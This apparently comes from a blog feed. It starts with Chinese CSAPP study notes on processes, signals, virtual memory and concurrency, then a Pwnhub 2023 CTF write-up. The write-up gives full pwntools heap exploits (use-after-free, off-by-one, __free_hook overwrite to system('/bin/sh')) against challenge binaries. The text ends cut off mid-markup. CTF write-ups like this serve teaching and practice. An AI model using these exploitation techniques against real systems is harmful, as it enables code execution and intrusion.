href="#8-4-3-回收子进程" class="headerlink" title="8.4.3 回收子进程"></a>8.4.3 回收子进程</h3><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050013956.png"></p><h3 id="8-4-5加载并运行程序"><a href="#8-4-5加载并运行程序" class="headerlink" title="8.4.5加载并运行程序"></a>8.4.5加载并运行程序</h3><p>execve函数在当前进程的上下文中加载并运行一个新程序</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt; unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">execve</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename,<span class="type">const</span> <span class="type">char</span>* argv[],<span class="type">const</span> <span class="type">char</span>* envp[])</span>;</span><br></pre></td></tr></tbody></table></figure><p>execve函数调用一次且只在发生错误(如找不到filename对应文件)才返回到调用程序.<br>argv变量指向一个以null结尾的指针数组,每个指针指向一个参数字符串,argv[0]为可执行目标文件的名字.envp指向一个以null结尾的指针数组,每个指针指向一个环境变量字符串,每个串都是形如”name=value”的名字-值对.<br>在execve加载了filename后,调用启动代码,将控制传递给新程序的主函数.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202305050022890.png"></p><h3 id="程序与进程"><a href="#程序与进程" class="headerlink" title="程序与进程"></a>程序与进程</h3><p>程序是一堆代码和数据,可以作为目标文件存在于磁盘上,或者作为段存在于地址空间中.进程时执行中程序的一个实例.</p><h3 id="利用fork和execve运行程序"><a href="#利用fork和execve运行程序" class="headerlink" title="利用fork和execve运行程序"></a>利用fork和execve运行程序</h3><h2 id="8-5-信号-重点且内容多-翻书查阅"><a href="#8-5-信号-重点且内容多-翻书查阅" class="headerlink" title="8.5 信号 (重点且内容多,翻书查阅)"></a>8.5 信号 (重点且内容多,翻书查阅)</h2><p>信号是更高层的软件形式的异常,低层的硬件异常是由内核异常处理程序处理的,正常情况下对用户进程不可见.信号提供一种机制,通知用户进程发生了这些异常.</p><h3 id="8-5-1-信号术语"><a href="#8-5-1-信号术语" class="headerlink" title="8.5.1 信号术语"></a>8.5.1 信号术语</h3><p>接收信号:当目的进程被内核强迫以某种方式对信号作出反应时,它就接收了信号.一个发出而没有被接收的信号叫待处理信号.在任何时刻,一种类型至多只会有一个待处理信号.如果一个进程由有一个类型为k的待处理信号,那么任何接下来发送到这个进程的类型k的信号都不会排队等待,而是被直接丢弃.(如果当前进程正在执行k的信号处理程序,此时再次收到信号k,该信号会排队等待而不是丢弃)<br>实时信号将不会被丢弃,而是多次注册.</p><p>捕获信号:调用信号处理程序<br>处理信号:执行信号处理程序</p><p>进程只有处理完信号才会返回用户态，进程在用户态下不会有未处理完的信号.<br>如果进程收到一个要捕捉的信号，那么进程从内核态返回用户态时执行用户定义的函数。而且执行用户定义的函数的方法很巧妙，内核是在用户栈上创建一个新的层，该层中将返回地址的值设置成用户定义的处理函数的地址，这样进程从内核返回弹出栈顶时就返回到用户定义的函数处，从函数返回再弹出栈顶时，才返回原先进入内核的地方。这样做的原因是用户定义的处理函数不能且不允许在内核态下执行(如果用户定义的函数在内核态下运行的话，用户就可以获得任何权限)</p><h2 id="8-6-非本地跳转"><a href="#8-6-非本地跳转" class="headerlink" title="8.6 非本地跳转"></a>8.6 非本地跳转</h2><p>setjmp(jmp_buf env),sigsetjmp(sigjmp_buf env,int savesigs)在参数env中保存当前调用环境.调用时返回0.且任何情形下返回值不能赋给变量.<br>(sigsetjmp保存的环境还包括信号的上下文:待处理的和被阻塞的信号向量)</p><p>longjmp(jmp_buf env,int retval)函数从env中恢复最近一次初始化该env的setjmp调用保存的环境,然后从setjmp返回,并带有非零的返回值retval.</p><p>也就是说,setjmp调用一次返回多次,longjmp调用一次,但从不返回.</p><p>非本地跳转的一个重要应用就是允许从一个深层嵌套的函数调用中立即返回.(比如检测到错误后立即跳转到错误处理程序而不是费力地解开调用栈.)</p><p>C++和Java地异常机制是较高层次的.catch类似于setjmp,throw类似于longjmp.</p><h1 id="第九章-虚拟内存"><a href="#第九章-虚拟内存" class="headerlink" title="第九章 虚拟内存"></a>第九章 虚拟内存</h1><h2 id="9-1-物理和虚拟寻址"><a href="#9-1-物理和虚拟寻址" class="headerlink" title="9.1 物理和虚拟寻址"></a>9.1 物理和虚拟寻址</h2><p>使用虚拟寻址,CPU通过生成一个虚拟地址(VA)来访问主存,该虚拟地址被CPU上芯片上的内存管理单元(利用存放在主存中的页表)翻译为物理地址.</p><h2 id="9-3-虚拟内存作为缓存的工具"><a href="#9-3-虚拟内存作为缓存的工具" class="headerlink" title="9.3 虚拟内存作为缓存的工具"></a>9.3 虚拟内存作为缓存的工具</h2><p>VM系统将虚拟内存分割为虚拟页(VP)作为主存和磁盘之间的传输单元.类似的,物理内存被分割为物理页(PP),大小与VP相同.物理页也被称为页帧(page frame)<br>在任意时刻虚拟页面的集合都分为三个不相交的子集:</p><ol><li>未分配的:VM还未分配或创建的页.未分配的页没有任何数据和它们相关联,因此也就不占用任何磁盘空间.</li><li>缓存的:当前已缓存在物理内存中的已分配页</li><li>未缓存的:未缓存在物理内存中的已分配页(即只存在于磁盘上)</li></ol><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>虚拟内存系统必须有某种方法判定一个虚拟页是否缓存在DRAM中的某个地方.如果是,系统还必须确定这个虚拟页存放在哪个物理页中.如果不命中,系统必须判断这个虚拟页存放在磁盘的哪个位置.在物理内存中选择一个牺牲页,并将虚拟页从磁盘复制到DRAM中,替换这个牺牲页.</p><p>页表存放在物理内存中,将虚拟页映射到物理页.每次地址翻译时都会读取页表.操作系统负责维护页表内容,以及在磁盘与DRAM之间来回传送页.<br>页表是一个页表条目(PTE)的数组.虚拟地址空间的每个页在页表中一个固定偏移量处都有一个PTE.</p><p>简化后的页表示意图:<br>将每个PTE简化为一个有效位和一个n位地址字段.<br>若有效位为1,说明该条目对应的虚拟页缓存在物理内存中,地址字段保存该物理页的物理页号.<br>若有效位为0,说明该条目对应虚拟页未缓存.地址字段表示该虚拟页对应的磁盘地址,若为空表示该虚拟页还未分配.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191358796.jpg"></p><h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p>DRAM缓存不命中称为缺页.<br>缺页后触发缺页异常,调用内核中的缺页异常处理程序,选择一个牺牲页进行替换(页面调度)并修改页表.若该牺牲页已经被修改过了,那么内核会将它复制回磁盘.<br>(言外之意就是,其实物理内存中的已经缓存的页在磁盘中也有一个副本,要是没修改过就不用更新,不过已分配页的磁盘地址保存在哪?)<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191403569.jpg"></p><h3 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h3><p>局部性原则保证了在任意时刻,程序趋向于在一个较小的活动页面集合上工作,这个集合叫做工作集或者常驻集合.如果工作集的大小超出了物理内存的大小,就产生”抖动”.</p><h2 id="9-6-地址翻译"><a href="#9-6-地址翻译" class="headerlink" title="9.6 地址翻译"></a>9.6 地址翻译</h2><p>口述一遍这个图的流程,每个流程是怎么实现的以及每一个流程的目的,为什么能加快速度或节约物理内存,地址翻译也就差不多搞清楚了.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306191759005.jpg"></p><h2 id="9-8-内存映射"><a href="#9-8-内存映射" class="headerlink" title="9.8 内存映射"></a>9.8 内存映射</h2><h3 id="内存映射与对象"><a href="#内存映射与对象" class="headerlink" title="内存映射与对象"></a>内存映射与对象</h3><p>Linux通过将一个虚拟内存区域与一个磁盘上的对象关联起来,以初始化这个虚拟内存区域的内容,这个过程称为写时映射.(对象分为普通文件和匿名文件)<br>如果一个进程将一个共享对象映射到它的虚拟地址空间的一个区域内,那么这个进程对这个区域的任何些操作,对于任何映射了这个共享对象的其他进程也是可见的.而且这些变化也会反映在磁盘上的原始对象中.<br>对于一个映射到私有对象的区域所作的改变,对其他进程来说是不可见的.并且进程对这个区域做的所有操作都不会反映在磁盘的对象中.(对这一点的理解,比如pwn题你改了bss段的数据,可执行文件改变了吗?)</p><p>当两个进程将同一个私有对象映射到虚拟内存中时,共享这个对象的同一个物理副本.该区域在每个进程的页表条目中都被标记为只读.当一个进程试图写这个区域时触发缺页异常,异常处理程序发现该异常是由于对<code>"私有的写时复制区域中的一个页面"</code>的写造成的,就会在物理内存中创建这个页面的一个新副本,更新该进程的页表条目指向这个新副本,恢复该页面的可写权限.</p><h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>当fork被进程调用,内核为新进程创建各种数据结构.创建了当前进程的mm_struct、区域结构和页表的原样副本,并将两个进程中的每个页面都标记为只读,每个区域结构都标记为私有的写时复制.(父子进程私有地址空间的原理)</p><blockquote><p>提问:既然都标为只读和私有的写时复制了,那父子进程都进行写操作后,不久存三个物理副本了?这不是浪费吗…<br>答:”进程对私有对象的区域所作的改变不会反映在磁盘对象中”,也就是说就算你只有一个进程,进行写的时候也会产生副本,因为改变不能反映在磁盘对象中</p></blockquote><h3 id="execve"><a href="#execve" class="headerlink" title="execve"></a>execve</h3><p>从内存映射的视角再看execve做了些什么.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">execve</span>(<span class="string">"a.out"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>);</span><br></pre></td></tr></tbody></table></figure><ol><li>删除已存在的用户区域,删除当前进程虚拟地址的用户部分中的已存在的区域结构</li><li>映射私有区域,为新程序的代码、数据、bss和栈区域创建新的数据结构.代码和数据区域被映射为可执行文件中的.text和.data区,bss段是请求二进制零的,映射到匿名文件.(这里可以与C/C++中的变量存储联系起来,什么样的变量会存到bss段?未初始化的静态变量和初始化为0的全局(或静态)变量)</li><li>映射共享区域.libc.so之类的.</li><li>设置程序计数器(PC),指向代码区域的入口点.<br>当然这只是完成了映射,当开始执行时,才调度页面进入主存.</li></ol><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>Linux进程可以使用mmap创建新的虚拟内存区域,并将对象映到这些区域中.</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span>* <span class="title">mmap</span><span class="params">(<span class="type">void</span>* start,<span class="type">size_t</span> lenth,<span class="type">int</span> prot,<span class="type">int</span> flags,<span class="type">int</span> fd,<span class="type">off_t</span> offset)</span></span></span><br><span class="line"><span class="function"><span class="comment">//start:新区域的起始地址</span></span></span><br><span class="line"><span class="function"><span class="comment">//prot:权限</span></span></span><br><span class="line"><span class="function"><span class="comment">//flags:对象类型,MAP_ANON,MAP_SHARED,MAP_PRIVATE</span></span></span><br><span class="line"><span class="function"><span class="comment">//fd:文件描述符(回想一下内存映射的对象就是文件)</span></span></span><br><span class="line"><span class="function"><span class="comment">//offset:映射开始位置相对文件起始位置的偏移量</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">munmap</span><span class="params">(<span class="type">void</span>* start,<span class="type">size_t</span> lenth)</span></span>;</span><br></pre></td></tr></tbody></table></figure><h2 id="9-9-动态内存分配"><a href="#9-9-动态内存分配" class="headerlink" title="9.9 动态内存分配"></a>9.9 动态内存分配</h2><h3 id="9-9-3-分配器的要求和目标"><a href="#9-9-3-分配器的要求和目标" class="headerlink" title="9.9.3 分配器的要求和目标"></a>9.9.3 分配器的要求和目标</h3><h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><ol><li>处理任意请求序列</li><li>立即响应请求</li><li>只使用堆</li><li>对齐块</li><li>不修改已分配的块</li></ol><h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><ol><li>最大化吞吐率</li><li>最大化内存利用率</li></ol><h3 id="9-9-5-实现问题"><a href="#9-9-5-实现问题" class="headerlink" title="9.9.5 实现问题"></a>9.9.5 实现问题</h3><p>空闲块组织:如何记录空闲块<br>放置:如何选择合适的空闲块来放置新分配的块<br>分割:在一个新分配的块放置到某个空闲块之后,我们如何处理这个空闲块中的剩余部分?<br>合并:如何处理一个刚刚释放的块(如何处理内存中连续的多个空闲块)</p><h1 id="第十一章-网络编程"><a href="#第十一章-网络编程" class="headerlink" title="第十一章 网络编程"></a>第十一章 网络编程</h1><h2 id="11-1-客户端-服务器编程模型"><a href="#11-1-客户端-服务器编程模型" class="headerlink" title="11.1 客户端-服务器编程模型"></a>11.1 客户端-服务器编程模型</h2><p>每个网络应用都是基于客户端-服务器模型的.该模型的基本操作是事物.<br>一个事物由四步组成:</p><ol><li>客户端向服务器发送请求</li><li>服务器接收、解释请求,以适当的方式操作它的资源.</li><li>服务器给客户端发送一个响应,等待下一个请求.</li><li>客户端收到响应并处理它.</li></ol><h2 id="11-3"><a href="#11-3" class="headerlink" title="11.3"></a>11.3</h2><p>数据可以同时双向流动,它是全双工的.<br>一个套接字是连接的一个断点.每个套接字都有相应的套接字地址.当客户端发起一个连接请求,客户端套接字地址的端口是由内核自动分配的,称为临时端口.<br>一个连接是由它两端的套接字地址唯一确定的.这对套接字地址叫做套接字对.<br>(cliaddr:cliport,servaddr:servport)</p><h1 id="第十二章-并发编程"><a href="#第十二章-并发编程" class="headerlink" title="第十二章 并发编程"></a>第十二章 并发编程</h1><p>互斥（mutualexclusion）:保证一个线程在临界区执行时，其他线程应该被阻止进入临界区.互斥也并不是只针对多线程。在多进程竞争共享资源的时候，也同样是可以使用互斥的方式来避免资源竞争造成的资源混乱。<br>同步，就是并发进程/线程在一些关键点上可能需要互相等待与互通消息，这种相互制约的等待与互通信息称为进程/线程同步。<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202306261127339.png"></p><p>互斥一般用锁来实现,同步用信号量来实现.信号量同时也可以用作互斥锁.</p><h2 id="12-5-用信号量同步线程"><a href="#12-5-用信号量同步线程" class="headerlink" title="12.5 用信号量同步线程"></a>12.5 用信号量同步线程</h2><h3 id="12-5-4-利用信号量来调度共享资源"><a href="#12-5-4-利用信号量来调度共享资源" class="headerlink" title="12.5.4 利用信号量来调度共享资源"></a>12.5.4 利用信号量来调度共享资源</h3><h4 id="生产者-消费者问题"><a href="#生产者-消费者问题" class="headerlink" title="生产者-消费者问题"></a>生产者-消费者问题</h4><h5 id="CSAPP实例程序中多个P-V操作的顺序问题"><a href="#CSAPP实例程序中多个P-V操作的顺序问题" class="headerlink" title="CSAPP实例程序中多个P,V操作的顺序问题"></a>CSAPP实例程序中多个P,V操作的顺序问题</h5><p>P的顺序是不可交换的,一定是先P可用槽数量或可用数据的信号量,再P互斥锁.否则当互斥锁上锁之后再发现无可用槽或数据,该线程阻塞,而此时对应的生产者/消费者线程由于无法互斥锁上锁同样阻塞,形成死锁.也就是说,互斥锁的上锁一定是在判断完其他条件之后,在正式访问、更改数据之前的最后一个操作.</p><p>V的顺序是可交换的,但类似示例程序的情形还是推荐先解锁.对于该次Insert后槽已填满的情况,V(slots)的行为的速度对其他线程并无影响.但互斥锁会阻塞消费者读取数据.所以先解锁再V(slots)可以加快消费者的速度,尽量减少槽被填满后下次生产者的阻塞.</p><h4 id="读者写者问题"><a href="#读者写者问题" class="headerlink" title="读者写者问题"></a>读者写者问题</h4><blockquote><pre><code>「读-读」允许：同一时刻，允许多个读者同时读「读-写」互斥：没有写者时读者才能读，没有读者时写者才能写「写-写」互斥：没有其他写者时，写者才能写</code></pre></blockquote><h4 id="生产者消费者区别和读者写者问题的区别"><a href="#生产者消费者区别和读者写者问题的区别" class="headerlink" title="生产者消费者区别和读者写者问题的区别"></a>生产者消费者区别和读者写者问题的区别</h4><p>前者用于数据生成和消费分离的场景,后者适用于读操作和写操作分离的场景.<br>多个读者可以同时读取共享数据.多个生产者不能同时完成生产.<br><a href="https://zhuanlan.zhihu.com/p/161936748">https://zhuanlan.zhihu.com/p/161936748</a></p><h3 id="12-7-5-死锁"><a href="#12-7-5-死锁" class="headerlink" title="12.7.5 死锁"></a>12.7.5 死锁</h3><p>如果每个线程都是以一种顺序获得互斥锁并已相反的顺序释放,那么这个程序就是无死锁的.</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnhub 2023 3月公开赛 WP</title>
      <link href="/2023/Pwnhub-2023-March-WP/"/>
      <url>/2023/Pwnhub-2023-March-WP/</url>
      
        <content type="html"><![CDATA[<p>Pwnhub 2023 3月公开赛 WP</p><h2 id="sh-v1-1"><a href="#sh-v1-1" class="headerlink" title="sh_v1_1"></a>sh_v1_1</h2><p>glibc2.31堆题<br>一堆莫名其妙的全局变量运算,白看了半天最后发现一点用都没有.<br>恢复一下结构体</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span>{</span></span><br><span class="line"><span class="type">long</span> flag;</span><br><span class="line"><span class="type">char</span> filename[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span>* content_ptr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序逻辑就是模拟的一个linux终端,输入命令进行相应处理.<br>漏洞在ln的时候可以备份指针造成uaf</p><span id="more"></span><p>先free两个堆块进tcache,然后uaf部分覆写next指针指向另一个堆块的size域,改成0x421放进unsortedbin泄露libc地址.<br>之后正常打free_hook就行了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">find_libc</span>(<span class="params">func,addr</span>):</span><br><span class="line">&nbsp; &nbsp; <span class="keyword">global</span> libc,libc_base,system_addr,binsh_addr,realloc_addr,free_hook_addr,onegadget</span><br><span class="line">&nbsp; &nbsp; libc = finder(func,addr)</span><br><span class="line">&nbsp; &nbsp; libc_base = libc.libcbase</span><br><span class="line">&nbsp; &nbsp; realloc_addr = libc.dump(<span class="string">'realloc'</span>)</span><br><span class="line">&nbsp; &nbsp; system_addr = libc.dump(<span class="string">'system'</span>)</span><br><span class="line">&nbsp; &nbsp; malloc_hook_addr = libc.dump(<span class="string">'__malloc_hook'</span>)</span><br><span class="line">&nbsp; &nbsp; free_hook_addr = libc.dump(<span class="string">'__free_hook'</span>)</span><br><span class="line">&nbsp; &nbsp; binsh_addr=libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">&nbsp; &nbsp; <span class="comment"># onegadget = libc.ogg(1)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">touch</span>(<span class="params">file,content</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'touch '</span>+file)</span><br><span class="line">&nbsp; &nbsp; sleep(<span class="number">0.1</span>)</span><br><span class="line">&nbsp; &nbsp; io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cp</span>(<span class="params">file1,file2</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'cp '</span>+file1+<span class="string">' '</span>+file2)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gedit</span>(<span class="params">file,content</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'gedit '</span>+file)</span><br><span class="line">&nbsp; &nbsp; sleep(<span class="number">0.1</span>)</span><br><span class="line">&nbsp; &nbsp; io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ls</span>():</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'ls'</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat</span>(<span class="params">file</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'cat '</span>+file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rm</span>(<span class="params">file</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'rm '</span>+file)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ln</span>(<span class="params">file1,file2</span>):</span><br><span class="line">&nbsp; &nbsp; io.sendlineafter(<span class="string">'&gt;&gt;&gt;&gt;'</span>,<span class="string">'ln '</span>+file1+<span class="string">' '</span>+file2)</span><br><span class="line"></span><br><span class="line">touch(<span class="string">'1'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'2'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'3'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'4'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'5'</span>,<span class="string">'a'</span>)</span><br><span class="line">ln(<span class="string">'1'</span>,<span class="string">'1_ln'</span>)</span><br><span class="line">ln(<span class="string">'1'</span>,<span class="string">'1_ln2'</span>)</span><br><span class="line">ln(<span class="string">'2'</span>,<span class="string">'2_ln'</span>)</span><br><span class="line">ln(<span class="string">'3'</span>,<span class="string">'3_ln'</span>)</span><br><span class="line">rm(<span class="string">'2'</span>)</span><br><span class="line">rm(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">cat(<span class="string">'1_ln'</span>)</span><br><span class="line">heap_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">0x4b0</span></span><br><span class="line">log.success(<span class="string">"heap_base is -&gt; "</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">'1_ln'</span>,<span class="string">'\xa0'</span>)</span><br><span class="line">touch(<span class="string">'6'</span>,<span class="string">'a'</span>)</span><br><span class="line">touch(<span class="string">'420'</span>,flat([<span class="number">0</span>,<span class="number">0x421</span>]))</span><br><span class="line">ln(<span class="string">'420'</span>,<span class="string">'420_ln'</span>)</span><br><span class="line">rm(<span class="string">'2_ln'</span>)</span><br><span class="line">gedit(<span class="string">'420_ln'</span>,<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">cat(<span class="string">'420_ln'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">main_arena = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))-<span class="number">96</span></span><br><span class="line">find_libc(<span class="string">'__malloc_hook'</span>,main_arena-<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">gedit(<span class="string">'420_ln'</span>,flat([<span class="number">0</span>,<span class="number">0x421</span>]))</span><br><span class="line">rm(<span class="string">'5'</span>)</span><br><span class="line">rm(<span class="string">'1_ln2'</span>)</span><br><span class="line">gedit(<span class="string">'1_ln'</span>,p64(free_hook_addr))</span><br><span class="line">touch(<span class="string">'HanQi'</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">touch(<span class="string">'pwn'</span>,p64(system_addr))</span><br><span class="line">rm(<span class="string">'HanQi'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="ttsc"><a href="#ttsc" class="headerlink" title="ttsc"></a>ttsc</h2><p>intro的时候可以泄露栈地址和libc地址.<br>栈地址只要填满buf就可以顺带出来,<br>而libc地址得益于scanf的匹配机制.<br>scanf(“%d”,&amp;v1);时若接收到无法匹配的数据,v1的值将不会被改变.<br>将原始的v1和v2分成高低部分赋给v8,gdb发现是一个_IO_file_jumps的地址<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202303130942054.png"><br>然后是正常的堆操作,edit的时候有个offbyone,overlap打free_hook就行<br>(偶然发现最后直接free掉free_hook那个堆块而不是’/bin/sh’那个也能getshell,不太懂)</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">intro(<span class="string">'a'</span>*<span class="number">0x10</span>,<span class="string">'-'</span>,<span class="string">'-'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'a'</span>*<span class="number">16</span>)</span><br><span class="line">rbp = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">io.recvuntil(<span class="string">'age: '</span>)</span><br><span class="line">IO_file_jumps_low = <span class="built_in">int</span>(io.recv(<span class="number">10</span>))</span><br><span class="line"><span class="keyword">if</span> IO_file_jumps_low&lt;<span class="number">0</span>:</span><br><span class="line">&nbsp; &nbsp; IO_file_jumps_low += <span class="number">0x100000000</span></span><br><span class="line">io.recvuntil(<span class="string">'high: '</span>)</span><br><span class="line">IO_file_jumps_high = <span class="built_in">int</span>(io.recv(<span class="number">5</span>))</span><br><span class="line">IO_file_jumps = IO_file_jumps_low+(IO_file_jumps_high&lt;&lt;<span class="number">32</span>)</span><br><span class="line">find_libc(<span class="string">'_IO_file_jumps'</span>,IO_file_jumps)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x48</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x28</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>,<span class="string">'a'</span>)</span><br><span class="line">edit(<span class="number">0</span>,flat([<span class="string">'a'</span>*<span class="number">0x40</span>,<span class="number">0x50</span>,<span class="string">b'\x71'</span>]))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,<span class="string">'a'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,flat([<span class="string">'\x00'</span>*<span class="number">0x28</span>,<span class="number">0x41</span>,free_hook_addr]))</span><br><span class="line"></span><br><span class="line">io.sendline()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x38</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h2 id="three-edit"><a href="#three-edit" class="headerlink" title="three_edit"></a>three_edit</h2><p>glibc2.31堆题,限制了堆块大小0x50-0x70<br>虽然题目叫three_edit,汇编代码中也确实有一个判断,不过是恒成立的所以可以无限edit.<br>看半天愣是没发现洞在哪,edit的时候没有检查idx的正负<br>(其实是关注了一下的,只不过当时看add函数看到idx是个unsigned int就没管了)</p><p>写入小于0的idx使edit的时候能使用tcache_perthread_struct中的指针完成uaf.<br>部分覆写next指针修改size域放进unsortedbin(调整一下堆块的位置就不用爆破一位了),然后切割unsortedbin中的chunk使得unsortedbin chunk的fd指针和某tcache chunk的next指针重合,再次uaf打io_leak.最后劫持free_hook.</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span 